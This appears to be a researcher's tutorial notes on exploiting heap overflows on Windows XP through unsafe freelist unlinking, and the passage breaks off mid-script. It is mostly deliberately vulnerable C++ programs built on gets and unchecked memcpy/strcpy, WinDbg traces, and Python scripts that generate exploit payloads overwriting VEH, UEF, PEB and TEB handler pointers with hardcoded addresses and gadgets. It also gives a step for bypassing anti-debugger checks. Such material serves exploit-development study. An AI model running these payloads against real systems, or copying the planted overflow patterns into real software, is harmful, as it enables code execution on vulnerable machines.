# Heap Exploitation via Heap Overflows

All exploitation methodologies target windows XP

### Overview

1. Unsafe Unlinking Exploitation

2. Lookaside List (LAL) Corruption

3. Freelist[0] Insert Attack

4. Freelist[0] Searching Attack

5. FreeListInUse Bitmap Flip Attack

6. Double Free (DID NOT DO)

### Set Up

[Windows XP SP1-SP3](https://archive.org/details/windows-xp-all-sp-msdn-iso-files-en-de-ru-tr-x86-x64)

[Other Windows ISO links](https://archive.org/details/WinXPHomeEditionSP1OEMEnglish)

MSVC 2006

### Unsafe Unlinking Exploit (only on SP1/SP0)

References:

- https://fuzzysecurity.com/tutorials/mr_me/2.html

- https://ethicalhackers.fr/blog/2020/12/02/a-flink-to-the-past-heap-overflow-through-unsafe-unlinking/

- https://flylib.com/books/en/1.545.1.53/1/
https://rce4fun.blogspot.com/2014/05/windows-heap-overflow-exploitation.html

- https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Microsoft/EN%20-%20Heap%20Bug%20-%20Heap%20Overflows%20For%20Humans.pdf

- https://samsclass.info/127/lec/127-ch8b.pdf

- https://brant-ruan.github.io/images/0day/54473267732EFADF62E7A8E13D2F0F7F.pdf

- https://www.exploit-db.com/exploits/13178

- https://samsclass.info/127/lec/ch8b.pdf

- http://www.phreedom.org/research/exploits/asn1-bitstring/

- https://www.travismathison.com/posts/PEB_TEB_TIB-Structure-Offsets/

- https://www.immunityinc.com/downloads/Heap_Singapore_Jun_2007.pdf

- https://www.ffri.jp/assets/files/monthly_research/MR201312_History%20and%20Current%20State%20of%20Heap%20Exploit_ENG.pdf

- https://www.ptsecurity.com/upload/corporate/ww-en/download/defeating-xpsp2-heap-protection.pdf

- https://www.blackhat.com/presentations/bh-usa-09/MCDONALD/BHUSA09-McDonald-WindowsHeap-PAPER.pdf

Overview:

When performing a Heap allocation, the backend heap manager is generally used to find free heap chunks from the freelist. Once a suitable chunk is found, it will be unlinked from the doubly-linked freelist list. For instance, if we are calling HeapAlloc(0x1000), and freelist[0] has a suitably big enough sized chunk (e.g. chunka), then that chunk would be unlinked from freelist[0]

- Before:

    ```         
    freelist[0] <-> chunka <-> chunkb <-> freelist[0]
                
    ```

- After:

    ```
    freelist[0] <-> chunkb <-> freelist[0]
    ```

The algorithm briefly looks like this:

```
chunka->blink->flink = chunka->flink
chunka->flink->blink = chunka->blink 
chunka->flink = NULL
chunka->blink = NULL
```
 
- Set the prev chunk of chunka to point to the next chunk of chunka

- Set the nex chunk of chunka to point back to previous chunk from chunka

Issue: there are no checks to validate this unlinking, which gives attackers essentially a 4 byte write primative

- Relevant breakpoints:  `77f6256f`, `77f5234c`

- Relevant code to unlinking:

    ```
    mov [ecx], eax
    mov [eax+4], ecx
    ```

Attack Sequence: We can perform a heap allocation, then perform a heap buffer overflow on the first heap allocation to fill the entire contents of the first heap allocation and into the flink/blink pointers of the next chunk (which is part of the doubly-linked freelist), before performing a second heap allocation to trigger the unlinking and achieving the 4 byte write primative. From this, we can further escalate to remote code execution via various measures:

1. Vectored Exception Handling 

    - Overview: use the 4 byte write to change the VEH pointer to our overflowed payload instead

    - Relevant code to VEH

        ```
        77F7F49E   8B35 1032FC77    MOV ESI,DWORD PTR DS:[77FC3210]
        77F7F4A4   EB 0E            JMP SHORT ntdll.77F7F4B4
        77F7F4A6   8D45 F8          LEA EAX,DWORD PTR SS:[EBP-8]
        77F7F4A9   50               PUSH EAX
        77F7F4AA   FF56 08          CALL DWORD PTR DS:[ESI+8]
        ```

        - Move whatever 77FC3210 is pointing to into ESI (hence 77FC3210 needs to point to shellcode)

        - Call pointer+8

    - Set EAX to a pointer which points to our shellcode, note that in Windows XP, there is no DEP or ASLR. The heap and stack is not even randomised. Hence, just find a stack pointer to the heap overflow and redirect code execution there.

    - Set ECX to 77FC3210

    - Vulnerable Program:

        ```
        // HeapOverflow1.cpp : Defines the entry point for the console application.
        //

        #include "stdafx.h"
        #include <windows.h>
        #include <stdio.h>
        #include <string.h>
        #include <iostream>
        #include <cstdio>
        #define SIZE 1000
        #define ALLOC 260

        DWORD MyExceptionHandler(void);
        int foo(unsigned char *buf1, int toUseStrCpy);

        int main(int argc, unsigned char *argv[])
        {
            HMODULE l;
            l = LoadLibrary("msvcrt.dll");
            l = LoadLibrary("netapi32.dll");
            printf("\n\nHeapoverflow program.\n");
            FILE* file = fopen("exploit.bin", "rb");
            unsigned char buffer[SIZE];

            int toUseStrCpy = 0;
            if (argc > 1) { toUseStrCpy = 1; }

            if (file) {
                while (!feof(file)) {
                    fread(buffer, 1, SIZE, file);
                }
                foo(buffer,toUseStrCpy);
            }
            return 0;
        }

        DWORD MyExceptionHandler(void)
        {
                printf("In exception handler....");
                ExitProcess(1);
                return 0;
        }
        
        int foo(unsigned char* buf1,int toUseStrCpy)
        {
                HLOCAL h2 = 0;
                HANDLE hp;
        
                __try {
                        hp = HeapCreate(0,0x1000,0x10000);
                        if(!hp){
                                return printf("Failed to create heap.\n");
                        }

                        //HLOCAL h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,ALLOC);
                        char* h1 = (char*)HeapAlloc(hp,HEAP_ZERO_MEMORY,ALLOC);
                        printf("HEAP: %.8X %.8X\n",h1,&h1);
        
                        // Heap Overflow occurs here:
                        // use memcpy instead of strcpy
                        // +1 to include null byte
                        printf("FINAL PAYLOAD: %s\n", buf1);
                        
                        // debug
                        char buffer[10];
                        gets(buffer);

                        if (toUseStrCpy == 0) {
                            memset(h1, '\0', SIZE);
                            memcpy(h1, buf1, SIZE);
                        } else {
                            printf("Using strcpy...\n");
                            strcpy(h1, (char*)buf1);
                        }

                        // This second call to HeapAlloc() is when we gain control
                        h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,ALLOC);
                        printf("hello");
                }
                __except(MyExceptionHandler()) {
                        printf("oops...");
                }
                return 0;
        }
        ```
    
    - Debugging:

        ```
        0:001> g
        (51c.d0): Access violation - code c0000005 (first chance)
        First chance exceptions are reported before any exception handling.
        This exception may be expected and handled.
        eax=45454545 ebx=00350000 ecx=44444444 edx=00350790 esi=00350790 edi=00000022
        eip=77f5234c esp=0012fa74 ebp=0012fc98 iopl=0         nv up ei pl zr na pe nc
        cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00010246
        ntdll!stricmp+0x28c:
        77f5234c 8908            mov     dword ptr [eax],ecx  ds:0023:45454545=????????
        0:000> k
        *** WARNING: Unable to verify checksum for C:\Program Files\Microsoft Visual Studio\MyProjects\HeapOverflowVEH\Debug\HeapOverflowVEH.exe
        ChildEBP RetAddr  
        WARNING: Stack unwind information not available. Following frames may be wrong.
        0012fc98 004014d0 ntdll!stricmp+0x28c
        0012fd2c 00401309 HeapOverflowVEH!foo+0x110 [C:\Program Files\Microsoft Visual Studio\MyProjects\HeapOverflowVEH\HeapOverflowVEH.cpp @ 67]
        0012ff80 00409039 HeapOverflowVEH!main+0xa9 [C:\Program Files\Microsoft Visual Studio\MyProjects\HeapOverflowVEH\HeapOverflowVEH.cpp @ 26]
        *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\system32\kernel32.dll - 
        0012ffc0 77e814c7 HeapOverflowVEH!mainCRTStartup+0xe9 [crt0.c @ 206]
        0012fff0 00000000 kernel32!GetCurrentDirectoryW+0x44
        0:000> g // after going, we can see that the exception logs are printed out
        eax=77c3c7f0 ebx=00000000 ecx=77c3b9f6 edx=00000000 esi=77f7663e edi=00000001
        eip=7ffe0304 esp=0012f514 ebp=0012f60c iopl=0         nv up ei pl nz na po nc
        cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
        SharedUserData!SystemCallStub+0x4:
        7ffe0304 c3              ret
        0:000> k
        ChildEBP RetAddr  
        0012f510 77f7664a SharedUserData!SystemCallStub+0x4
        WARNING: Stack unwind information not available. Following frames may be wrong.
        0012f60c 77e7990f ntdll!NtTerminateProcess+0xc
        0012f620 0040138f kernel32!ExitProcess+0x12
        0012f678 004014f5 HeapOverflowVEH!MyExceptionHandler+0x2f [C:\Program Files\Microsoft Visual Studio\MyProjects\HeapOverflowVEH\HeapOverflowVEH.cpp @ 34]
        0012fd2c 00401309 HeapOverflowVEH!foo+0x135 [C:\Program Files\Microsoft Visual Studio\MyProjects\HeapOverflowVEH\HeapOverflowVEH.cpp @ 70]
        0012ff80 00409039 HeapOverflowVEH!main+0xa9 [C:\Program Files\Microsoft Visual Studio\MyProjects\HeapOverflowVEH\HeapOverflowVEH.cpp @ 26]
        0012ffc0 77e814c7 HeapOverflowVEH!mainCRTStartup+0xe9 [crt0.c @ 206]
        0012fff0 00000000 kernel32!GetCurrentDirectoryW+0x44
        ```

        - Sometimes 77f5234c is used, sometimes 77f6256f is used. Both can be used to achieve 4 byte write but if 77f6256f is used, the eax and ecx positions are inversed. 

        - Need to adjust the eax and ecx accordingly. If strcpy() is used and there is a nullbyte, it becomes tricky as well. For the vulnerable program, we can use strcpy or memcpy to trigger the heap bof.

        ```
        0:000> k
        ChildEBP RetAddr  
        WARNING: Frame IP not in any known module. Following frames may be wrong.
        0012f4ec 77f7f4ad 0x909090cc
        0012f50c 77f60b7c ntdll!RtlCaptureContext+0x5897
        0012f580 77fb4dbd ntdll!CsrCaptureMessageString+0xf1
        0012faa4 004014d0 ntdll!KiUserExceptionDispatcher+0xe
        0012fb38 00401309 HeapOverflowVEH!foo+0x110 [C:\Program Files\Microsoft Visual Studio\MyProjects\HeapOverflowVEH\HeapOverflowVEH.cpp @ 68]
        0012ff80 00409039 HeapOverflowVEH!main+0xa9 [C:\Program Files\Microsoft Visual Studio\MyProjects\HeapOverflowVEH\HeapOverflowVEH.cpp @ 27]
        0012ffc0 77e814c7 HeapOverflowVEH!mainCRTStartup+0xe9 [crt0.c @ 206]
        0012fff0 00000000 kernel32!GetCurrentDirectoryW+0x44

        ntdll!RtlCaptureContext+0x5894:
        77f7f4aa ff5608          call    dword ptr [esi+8]
        77f7f4ad 83f8ff          cmp     eax,0FFFFFFFFh
        77f7f4b0 741a            je      ntdll!RtlCaptureContext+0x58b6 (77f7f4cc)
        77f7f4b2 8b36            mov     esi,dword ptr [esi]
        77f7f4b4 3bf7            cmp     esi,edi
        77f7f4b6 75ee            jne     ntdll!RtlCaptureContext+0x5890 (77f7f4a6)
        77f7f4b8 80650b00        and     byte ptr [ebp+0Bh],0
        77f7f4bc 53              push    ebx
        ```

        - We can observe that call [esi+8] is being called and that the program is trying to dispatch user exception and hence the relevant VEH code is here.

    - Exploit:

        ```
        import os
        import struct

        MAX = 1000

        def working_exploit_memcpy_260_veh():
            exploit = "\x90" * (272-4) # - from island jmp
            #exploit = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj"
            #exploit += "DDDD"
            #exploit += "EEEE"
            exploit += "\xeb\x40\x90\x90"
            exploit += "\x0c\x32\xfc\x77"
            exploit += "\xc4\xfc\x12\x00"
            exploit += "w00tw00t"
            exploit += "\x90" * 28
            exploit += "\x85\x94\xc1\x77"
            exploit += "\xcc" * 50
            exploit += "r00tr00t"
            exploit += "\x90" * (MAX-len(exploit))
            #bp 77f6256f 77f5234c // arbitrary writes
            #shellcode pointers 0012f9ac 0012fcc4
            #jmp_esi 77c19485
            return exploit 

        exploit = working_exploit_memcpy_260_veh()
        with open("exploit.bin", "wb") as file:
            file.write(exploit)
            file.close()
        ```

2. Unhandled Exception Filter

    - Overview: use the 4 byte write to change the UEF pointer to our overflowed payload instead

    - Relevant code to UEF:

        ```
        77E93114   A1 B473ED77      MOV EAX,DWORD PTR DS:[77ED73B4]
        77E93119   3BC6             CMP EAX,ESI
        77E9311B   74 15            JE SHORT kernel32.77E93132
        77E9311D   57               PUSH EDI
        77E9311E   FFD0             CALL EAX
        ```

        ```
        0:000> u 77E93114
        kernel32!UnhandledExceptionFilter+0x54:
        77e93114 a1b473ed77      mov     eax,dword ptr [kernel32!VerSetConditionMask+0x3855 (77ed73b4)]
        77e93119 3bc6            cmp     eax,esi
        77e9311b 7415            je      kernel32!UnhandledExceptionFilter+0x72 (77e93132)
        77e9311d 57              push    edi
        77e9311e ffd0            call    eax
        77e93120 83f801          cmp     eax,1
        77e93123 0f84e9030000    je      kernel32!UnhandledExceptionFilter+0x452 (77e93512)
        77e93129 83f8ff          cmp     eax,0FFFFFFFFh
        ```

    - Set EAX to a pointer which points to our shellcode (we set it to a call [edi+74] instruction @ 0x77C3BBAD as edi+74 points to our shellcode)

    - Set ECX to 77ED73B4

    - To trigger UEF in Windbg, need to disable the anti-debugger checks:

        - `bp 0x77E9310B`

        - When breakpoint hits, `ed ebp-20 00000000`

    - If you are using Immunity Debugger, you can run `!hidedebug all_debug`

    - Vulnerable Program:

        ```
        // HeapOverflow1.cpp : Defines the entry point for the console application.
        //

        #include "stdafx.h"
        #include <windows.h>
        #include <stdio.h>
        #include <string.h>
        #include <iostream>
        #include <cstdio>
        #define SIZE 1000
        #define ALLOC 4

        int foo(unsigned char *buf1, int toUseStrCpy);

        int main(int argc, unsigned char *argv[])
        {
            HMODULE l;
            l = LoadLibrary("msvcrt.dll");
            l = LoadLibrary("netapi32.dll");
            printf("\n\nHeapoverflow program.\n");
            FILE* file = fopen("exploit.bin", "rb");
            unsigned char buffer[SIZE];

            int toUseStrCpy = 0;
            if (argc > 1) { toUseStrCpy = 1; }

            if (file) {
                while (!feof(file)) {
                    fread(buffer, 1, SIZE, file);
                }
                foo(buffer,toUseStrCpy);
            }
            return 0;
        }
        
        int foo(unsigned char* buf1,int toUseStrCpy)
        {
                HLOCAL h2 = 0;
                HANDLE hp;
        
                hp = HeapCreate(0,0x1000,0x10000);
                if(!hp){
                        return printf("Failed to create heap.\n");
                }

                //HLOCAL h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,ALLOC);
                char* h1 = (char*)HeapAlloc(hp,HEAP_ZERO_MEMORY,ALLOC);
                printf("HEAP: %.8X %.8X\n",h1,&h1);

                // Heap Overflow occurs here:
                // use memcpy instead of strcpy
                // +1 to include null byte
                printf("FINAL PAYLOAD: %s\n", buf1);
                
                // debug
                char buffer[10];
                gets(buffer);

                if (toUseStrCpy == 0) {
                    memset(h1, '\0', SIZE);
                    memcpy(h1, buf1, SIZE);
                } else {
                    printf("Using strcpy...\n");
                    strcpy(h1, (char*)buf1);
                }

                // This second call to HeapAlloc() is when we gain control
                h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,ALLOC);
                printf("hello");
                return 0;
        }
        ```

    - Debugging:

        ```
        0:000> r
        eax=77c26e79 ebx=c0000005 ecx=0012ef38 edx=7ffe0304 esi=00000000 edi=0012f4bc
        eip=77e9311e esp=0012ef50 ebp=0012f470 iopl=0         nv up ei pl nz na po nc
        cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
        kernel32!UnhandledExceptionFilter+0x5e:
        77e9311e ffd0            call    eax {msvcrt!_unDNameEx+0x725 (77c26e79)}
        0:000> dd edi+74
        0012f530  00350690 30203838 46323130 0d343242
        0012f540  0012f50a 0012f5bf 00000000 0012f600
        0012f550  0012f62c 77e79ce1 0012f574 00000000
        0012f560  0002021e 77e79d17 00000007 0012fb40
        0012f570  0012f6b8 0098007c 0069ff34 0025069c
        0012f580  000003fc 004ebb48 00000000 00130000
        0012f590  0012e000 0012fab8 77fb4dbd 00000000
        0012f5a0  0012f5c8 0012f5ac 0012f5c8 c0000005
        0:000> dd 00350690 
        00350690  41414141 41414141 42424242 43434343
        003506a0  cccccccc cccccccc cccccccc cccccccc
        003506b0  cccccccc cccccccc cccccccc cccccccc
        003506c0  cccccccc cccccccc cccccccc cccccccc
        003506d0  cccccccc cccccccc cccccccc cccccccc
        003506e0  cccccccc cccccccc cccccccc cccccccc
        003506f0  cccccccc cccccccc cccccccc cccccccc
        00350700  cccccccc cccccccc cccccccc cccccccc
        ```

    - Exploit:

        ```
        def exploit_strcpy_4_uef():
            exploit = "A" * 16
            exploit += "BBBB"
            exploit += "CCCC"
            # bp 0x77E9310B            // ed ebp-20 00000000
            # bp 0x77E93114            // UEF Subroutine
            # bp 0x77f6256f 0x77f5234c // arbitrary writes
            # 0x77C3BBAD
            # 0x77ED73B4 
            return exploit
        ```

3. PEB Pointers

    - RtlEnterCriticalSection(), called by RtlAcquirePebLock() and RtlReleasePebLock(), is called whenever a process exits with ExitProcess() 

    - Overview: use the 4 byte write to change the RtlEnterCriticalSection to our overflowed payload instead

    - RtlEnterCriticalSection is located at poi(fs:[0x30]) + 0x20

    - Relevant code:

        ```
        0:000> dd fs:[0x30]
        0038:00000030  7ffdf000 00000000 00000000 00000000
        0038:00000040  00000000 00000000 00000000 00000000
        0038:00000050  00000000 00000000 00000000 00000000
        0038:00000060  00000000 00000000 00000000 00000000
        0038:00000070  00000000 00000000 00000000 00000000
        0038:00000080  00000000 00000000 00000000 00000000
        0038:00000090  00000000 00000000 00000000 00000000
        0038:000000a0  00000000 00000000 00000000 00000000
        0:000> dd 7ffdf000 
        7ffdf000  00010000 ffffffff 00400000 00241e90
        7ffdf010  00020000 00000000 00140000 77fc4d80
        7ffdf020  77f755de 77f75690 00000001 00000000
        7ffdf030  00000000 00000000 00000000 00000000
        7ffdf040  77fc4c50 00000001 00000000 7f6f0000
        7ffdf050  7f6f0000 7f6f0688 7ffb0000 7ffc1000
        7ffdf060  7ffd2000 00000001 00000000 00000000
        7ffdf070  079b8000 ffffe86d 00100000 00002000
        0:000> u 77f755de 
        ntdll!RtlEnterCriticalSection:
        77f755de 648b0d18000000  mov     ecx,dword ptr fs:[18h]
        77f755e5 8b542404        mov     edx,dword ptr [esp+4]
        77f755e9 837a1400        cmp     dword ptr [edx+14h],0
        77f755ed 753b            jne     ntdll!RtlEnterCriticalSection+0x4c (77f7562a)
        77f755ef f0ff4204        lock inc dword ptr [edx+4]
        77f755f3 7512            jne     ntdll!RtlEnterCriticalSection+0x29 (77f75607)
        77f755f5 8b4124          mov     eax,dword ptr [ecx+24h]
        77f755f8 89420c          mov     dword ptr [edx+0Ch],eax
        ```

    - Vulnerable Program:

        ```
        // HeapOverflow1.cpp : Defines the entry point for the console application.
        //

        #include "stdafx.h"
        #include <windows.h>
        #include <stdio.h>
        #include <string.h>
        #include <iostream>
        #include <cstdio>
        #define SIZE 1000
        #define ALLOC 260

        DWORD MyExceptionHandler(void);
        int foo(unsigned char *buf1, int toUseStrCpy);

        int main(int argc, unsigned char *argv[])
        {
            HMODULE l;
            l = LoadLibrary("msvcrt.dll");
            l = LoadLibrary("netapi32.dll");
            printf("\n\nHeapoverflow program.\n");
            FILE* file = fopen("exploit.bin", "rb");
            unsigned char buffer[SIZE];

            int toUseStrCpy = 0;
            if (argc > 1) { toUseStrCpy = 1; }

            if (file) {
                while (!feof(file)) {
                    fread(buffer, 1, SIZE, file);
                }
                foo(buffer,toUseStrCpy);
            }
            return 0;
        }

        DWORD MyExceptionHandler(void)
        {
                printf("In exception handler....");
                ExitProcess(1);
                return 0;
        }
        
        int foo(unsigned char* buf1,int toUseStrCpy)
        {
                HLOCAL h2 = 0;
                HANDLE hp;
        
                __try {
                        hp = HeapCreate(0,0x1000,0x10000);
                        if(!hp){
                                return printf("Failed to create heap.\n");
                        }

                        //HLOCAL h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,ALLOC);
                        char* h1 = (char*)HeapAlloc(hp,HEAP_ZERO_MEMORY,ALLOC);
                        printf("HEAP: %.8X %.8X\n",h1,&h1);
        
                        // Heap Overflow occurs here:
                        // use memcpy instead of strcpy
                        // +1 to include null byte
                        printf("FINAL PAYLOAD: %s\n", buf1);
                        
                        // debug
                        char buffer[10];
                        gets(buffer);

                        if (toUseStrCpy == 0) {
                            memset(h1, '\0', SIZE);
                            memcpy(h1, buf1, SIZE);
                        } else {
                            printf("Using strcpy...\n");
                            strcpy(h1, (char*)buf1);
                        }

                        // This second call to HeapAlloc() is when we gain control
                        h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,ALLOC);
                        printf("hello");
                }
                __except(MyExceptionHandler()) {
                        printf("oops...");
                }
                return 0;
        }
        ```

    - Debugging:

        ```
        0:000> r
        eax=7ffdf020 ebx=00350000 ecx=0012fcc4 edx=00350790 esi=00350790 edi=00000022
        eip=77f5234c esp=0012f878 ebp=0012fa9c iopl=0         nv up ei pl zr na pe nc
        cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246
        ntdll!stricmp+0x28c:
        77f5234c 8908            mov     dword ptr [eax],ecx  ds:0023:7ffdf020={ntdll!RtlEnterCriticalSection (77f755de)}
        0:000> g
        (6b0.3a8): Access violation - code c0000005 (first chance)
        First chance exceptions are reported before any exception handling.
        This exception may be expected and handled.
        eax=4444443c ebx=0000691f ecx=44444444 edx=00350790 esi=00350178 edi=003508a0
        eip=77f52054 esp=0012f878 ebp=0012fa9c iopl=0         nv up ei ng nz na po cy
        cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00010283
        ntdll!RtlUpcaseUnicodeChar+0x27:
        77f52054 663b18          cmp     bx,word ptr [eax]        ds:0023:4444443c=????
        0:000> g
        Breakpoint 2 hit
        eax=7ffdf000 ebx=00000000 ecx=0012fcc4 edx=00433e50 esi=0012f430 edi=0012f47c
        eip=0012fcc4 esp=0012f2e4 ebp=0012f320 iopl=0         nv up ei pl zr na pe nc
        cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
        0012fcc4 90              nop
        0:000> k
        ChildEBP RetAddr  
        WARNING: Frame IP not in any known module. Following frames may be wrong.
        0012f2e0 77f52013 0x12fcc4
        0012f320 77e798b4 ntdll!RtlAcquirePebLock+0x28
        0012f410 77e7990f kernel32!GetTimeZoneInformation+0x2c7
        0012f424 004013af kernel32!ExitProcess+0x12
        0012f47c 0040153a HeapOverflowPEB!MyExceptionHandler+0x2f [C:\Program Files\Microsoft Visual Studio\MyProjects\HeapOverflowPEB\HeapOverflowPEB.cpp @ 40]
        0012fb30 0040132a HeapOverflowPEB!foo+0x15a [C:\Program Files\Microsoft Visual Studio\MyProjects\HeapOverflowPEB\HeapOverflowPEB.cpp @ 80]
        0012ff80 004023d9 HeapOverflowPEB!main+0xca [C:\Program Files\Microsoft Visual Studio\MyProjects\HeapOverflowPEB\HeapOverflowPEB.cpp @ 32]
        0012ffc0 77e814c7 HeapOverflowPEB!mainCRTStartup+0xe9 [crt0.c @ 206]
        0012fff0 00000000 kernel32!GetCurrentDirectoryW+0x44
        ```

    - Exploit:

        ```
        def working_exploit_memcpy_260_peb():
            #exploit = "\x90" * 272
            exploit = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj"
            exploit += "DDDD"
            exploit += "EEEE"
            exploit += "\x90" * (MAX-len(exploit))
            #bp 77f6256f 77f5234c // arbitrary writes
            #shellcode pointers 0012f9ac 0012fcc4
            return exploit 
        ```

4. TEB Exception Handlers

    - Overview: use the 4 byte write to change the relevant TEB exception handlers to our shellcode

    - Relevant code:

        ```
        0:000> dd fs:[0]
        *** WARNING: Unable to verify checksum for C:\Program Files\Microsoft Visual Studio\MyProjects\HeapOverflowPEB\Debug\HeapOverflowPEB.exe
        0038:00000000  0012fa8c 00130000 0012e000 00000000
        0038:00000010  00001e00 00000000 7ffde000 00000000
        0038:00000020  000002a4 00000480 00000000 00000000
        0038:00000030  7ffdf000 00000000 00000000 00000000
        0038:00000040  00000000 00000000 00000000 00000000
        0038:00000050  00000000 00000000 00000000 00000000
        0038:00000060  00000000 00000000 00000000 00000000
        0038:00000070  00000000 00000000 00000000 00000000
        0:000> dd 0012fa8c 
        0012fa8c  0012fb20 77f79005 77f6d5e0 00000000
        0012fa9c  0012fb30 00401515 00350000 00000008
        0012faac  00000104 0012ff80 0012fb40 7ffdf000
        0012fabc  cccccccc cccccccc cccccccc cccccccc
        0012facc  cccccccc cccccccc cccccccc cccccccc
        0012fadc  cccccccc cccccccc cccccccc cccccccc
        0012faec  cccccccc cccccccc cccccccc cccccccc
        0012fafc  cccccccc cccccc00 cccccccc cccccccc
        0:000> dd 0012fa8c + 100
        0012fb8c  00000000 41306141 61413161 33614132
        0012fb9c  41346141 61413561 37614136 41386141
        0012fbac  62413961 31624130 41326241 62413362
        0012fbbc  35624134 41366241 62413762 39624138
        0012fbcc  41306341 63413163 33634132 41346341
        0012fbdc  63413563 37634136 41386341 64413963
        0012fbec  31644130 41326441 64413364 35644134
        0012fbfc  41366441 64413764 39644138 41306541
        ```

    - Vulnerable Program:

        ```
        // HeapOverflow1.cpp : Defines the entry point for the console application.
        //

        #include "stdafx.h"
        #include <windows.h>
        #include <stdio.h>
        #include <string.h>
        #include <iostream>
        #include <cstdio>
        #define SIZE 1000
        #define ALLOC 260

        DWORD MyExceptionHandler(void);
        int foo(unsigned char *buf1, int toUseStrCpy, int divide);

        int main(int argc, unsigned char *argv[])
        {
            HMODULE l;
            l = LoadLibrary("msvcrt.dll");
            l = LoadLibrary("netapi32.dll");
            printf("\n\nHeapoverflow program.\n");
            FILE* file = fopen("exploit.bin", "rb");
            unsigned char buffer[SIZE];

            int toUseStrCpy = 0;
            long toDivide = 1;
            char* output;
            if (argc == 2) { toUseStrCpy = strtol((char*)argv[1], &output, 10); }
            if (argc == 3) { toUseStrCpy = strtol((char*)argv[1], &output, 10); toDivide = strtol((char*)argv[2], &output, 10); }

            printf("%d %d\n", toUseStrCpy, toDivide);

            if (file) {
                while (!feof(file)) {
                    fread(buffer, 1, SIZE, file);
                }
                foo(buffer,toUseStrCpy, toDivide);
            }
            return 0;
        }

        DWORD MyExceptionHandler(void)
        {
                printf("In exception handler....");
                ExitProcess(1);
                return 0;
        }
        
        int foo(unsigned char* buf1,int toUseStrCpy, int divide)
        {
                HLOCAL h2 = 0;
                HANDLE hp;
        
                __try {
                        hp = HeapCreate(0,0x1000,0x10000);
                        if(!hp){
                                return printf("Failed to create heap.\n");
                        }

                        //HLOCAL h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,ALLOC);
                        char* h1 = (char*)HeapAlloc(hp,HEAP_ZERO_MEMORY,ALLOC);
                        printf("HEAP: %.8X %.8X\n",h1,&h1);
        
                        // Heap Overflow occurs here:
                        // use memcpy instead of strcpy
                        // +1 to include null byte
                        printf("FINAL PAYLOAD: %s\n", buf1);
                        
                        // debug
                        char buffer[10];
                        gets(buffer);

                        if (toUseStrCpy == 0) {
                            memset(h1, '\0', SIZE);
                            memcpy(h1, buf1, SIZE);
                        } else {
                            printf("Using strcpy...\n");
                            strcpy(h1, (char*)buf1);
                        }

                        // This second call to HeapAlloc() is when we gain control
                        h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,ALLOC);
                        //int h3 = 5/divide;
                        printf("hello, 5 / input = %d\n", 5/divide);
                }
                __except(MyExceptionHandler()) {
                        printf("oops...");
                }
                return 0;
        }
        ```

    - Debugging:

        ```
        0:001> bp 77f5234c 
        0:001> g
        Breakpoint 0 hit
        eax=42424242 ebx=00350000 ecx=00326310 edx=00350790 esi=00350790 edi=00000022
        eip=77f5234c esp=0012f86c ebp=0012fa90 iopl=0         nv up ei pl zr na pe nc
        cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246
        ntdll!stricmp+0x28c:
        77f5234c 8908            mov     dword ptr [eax],ecx  ds:0023:42424242=????????
        0:000> r eax=0012fb18
        *** WARNING: Unable to verify checksum for C:\Program Files\Microsoft Visual Studio\MyProjects\HeapOverflowTEB\Debug\HeapOverflowTEB.exe
        0:000> r
        eax=0012fb18 ebx=00350000 ecx=00326310 edx=00350790 esi=00350790 edi=00000022
        eip=77f5234c esp=0012f86c ebp=0012fa90 iopl=0         nv up ei pl zr na pe nc
        cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246
        ntdll!stricmp+0x28c:
        77f5234c 8908            mov     dword ptr [eax],ecx  ds:0023:0012fb18={HeapOverflowTEB!_except_handler3 (00402628)}
        ```

    - Exploit

        ```
        def working_exploit_memcpy_260_teb():
            exploit = "\x90" * 272
